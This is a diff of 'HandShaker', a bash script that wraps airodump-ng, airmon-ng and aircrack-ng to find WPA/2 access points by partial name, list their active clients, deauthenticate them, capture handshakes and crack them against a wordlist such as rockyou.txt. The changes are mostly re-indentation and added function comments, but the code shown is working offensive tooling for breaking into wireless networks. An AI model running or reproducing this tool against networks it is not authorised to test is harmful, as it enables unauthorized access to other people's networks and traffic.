@@ -14,7 +14,7 @@
 ## more details.
 
 
-fapscan()
+fapscan()																#Determine AP BSSID and channel
 {
 	clear
 	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 -a -w $HOME/tmp -o csv&
@@ -35,49 +35,49 @@ fapscan()
 	fapscan
 }
 
-fclientscan()
+fclientscan()															#Find active clients
 {
-		if [ ${BSSID:2:1} != ":" ] 2> /dev/null
-			then
-				rm -rf $HOME/tmp* 2> /dev/null
-				fapscan
-		fi
-		rm -rf $HOME/tmp* 2> /dev/null
-		CNT="0"
-		clear
-		if [ ${CHAN:1:1} = "," ] 2> /dev/null
-			then
-				CHAN=${CHAN:0:1}
-		fi
-		$COLOR 2;echo " [*] $ESSID Found! BSSID:$BSSID CHANNEL:$CHAN [*]"
-		echo
-		$COLOR 4;echo ' [*] Please wait while I gather active stations.. [*]';$COLOR 9
-		gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w $HOME/tmp1&
-		DONE=""
-		while [ $DONE -z ] 2> /dev/null
-			do
-				sleep 2
-				DONE=$(cat $HOME/tmp1-01.csv 2> /dev/null | grep 'Station' -A 10 | grep $BSSID)
-			done
-		DONE=$(cat $HOME/tmp1-01.csv 2> /dev/null | grep 'Station' -A 10)
-		echo "$DONE" > $HOME/tmp
-		while read LINE
-			do
-				if [ ${LINE:0:4} != "Stat" ] 2> /dev/null
-					then
-						echo ${LINE:0:17} >> $HOME/tmp1
-				fi
-			done < $HOME/tmp
-		while read LINE
-			do
-				case ${LINE:2:1} in
-				":")CNT=$(( CNT + 1 ));;
-				esac
-			done < $HOME/tmp1
-		fcap
+	if [ ${BSSID:2:1} != ":" ] 2> /dev/null
+		then
+			rm -rf $HOME/tmp* 2> /dev/null
+			fapscan
+	fi
+	rm -rf $HOME/tmp* 2> /dev/null
+	CNT="0"
+	clear
+	if [ ${CHAN:1:1} = "," ] 2> /dev/null
+		then
+			CHAN=${CHAN:0:1}
+	fi
+	$COLOR 2;echo " [*] $ESSID Found! BSSID:$BSSID CHANNEL:$CHAN [*]"
+	echo
+	$COLOR 4;echo ' [*] Please wait while I gather active stations.. [*]';$COLOR 9
+	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w $HOME/tmp1&
+	DONE=""
+	while [ $DONE -z ] 2> /dev/null
+		do
+			sleep 0.3
+			DONE=$(cat $HOME/tmp1-01.csv 2> /dev/null | grep 'Station' -A 10 | grep $BSSID)
+		done
+	DONE=$(cat $HOME/tmp1-01.csv 2> /dev/null | grep 'Station' -A 10)
+	echo "$DONE" > $HOME/tmp
+	while read LINE
+		do
+			if [ ${LINE:0:4} != "Stat" ] 2> /dev/null
+				then
+					echo ${LINE:0:17} >> $HOME/tmp1
+			fi
+		done < $HOME/tmp
+	while read LINE
+		do
+			case ${LINE:2:1} in
+			":")CNT=$(( CNT + 1 ));;
+			esac
+		done < $HOME/tmp1
+	fcap
 }
 
-fcap()
+fcap()																	#Deauth, capture and strip handshakes
 {
 	CHKEX="0"
 	if [ $CNT = 1 ] 2> /dev/null
@@ -165,7 +165,7 @@ fcap()
 	exit
 }
 
-fcrack()
+fcrack()																#Crack handshakes
 {
 	clear
 	if [ $WORDLIST -z ] 2> /dev/null
@@ -184,22 +184,22 @@ fcrack()
 	fi
 }
 
-fexit()
+fexit()																	#Exit
 {
-			tput setab 9
-			killall aircrack-ng 2> /dev/null
-			rm -rf $HOME/tmp* 2> /dev/null
-			MOND=$(ifconfig | grep mon0)
-			if [ $MOND -z ] 2> /dev/null
-				then
-					exit
-				else
-					airmon-ng stop mon0
-			fi
+	tput setab 9
+	killall aircrack-ng 2> /dev/null
+	rm -rf $HOME/tmp* 2> /dev/null
+	MOND=$(ifconfig | grep mon0)
+	if [ $MOND -z ] 2> /dev/null
+		then
 			exit
+		else
+			airmon-ng stop mon0
+	fi
+	exit
 }
 
-fhelp()
+fhelp()																	#Help
 {
 	clear
 	echo """ HandShaker - Detect, capture and crack WPA/2 handshakes by partial unique ESSID
@@ -210,36 +210,36 @@ fhelp()
 			z - path to wordlist to use for cracking
 				
 	eg. handshaker Hub3-F wlan0 /usr/share/wordlists/rockyou.txt"""
-exit
+	exit
 }
 
 
 
-fstart()
+fstart()																#Startup
 {
-COLOR="tput setab"
-COLOR2="tput setaf"
-CHKEX=1
-MOND=$(ifconfig | grep mon0)
-mkdir -p $HOME/Desktop/cap
-mkdir -p $HOME/Desktop/cap/handshakes
+	COLOR="tput setab"
+	COLOR2="tput setaf"
+	CHKEX=1
+	MOND=$(ifconfig | grep mon0)
+	mkdir -p $HOME/Desktop/cap
+	mkdir -p $HOME/Desktop/cap/handshakes
 
-if [ $MOND -z ] 2> /dev/null
-	then
-		clear
-		$COLOR 4;echo " [>] Which interface do you want to use?:";$COLOR 9
-		echo
-		iwconfig | grep "wlan"
-		echo
-		read -p "  >" NIC
-		clear
-		airmon-ng start $NIC
-		clear
-	else
-		NIC="mon0"
-		clear
-fi
-fapscan
+	if [ $MOND -z ] 2> /dev/null
+		then
+			clear
+			$COLOR 4;echo " [>] Which interface do you want to use?:";$COLOR 9
+			echo
+			iwconfig | grep "wlan"
+			echo
+			read -p "  >" NIC
+			clear
+			airmon-ng start $NIC
+			clear
+		else
+			NIC="mon0"
+			clear
+	fi
+	fapscan
 }
 
 trap fexit 2
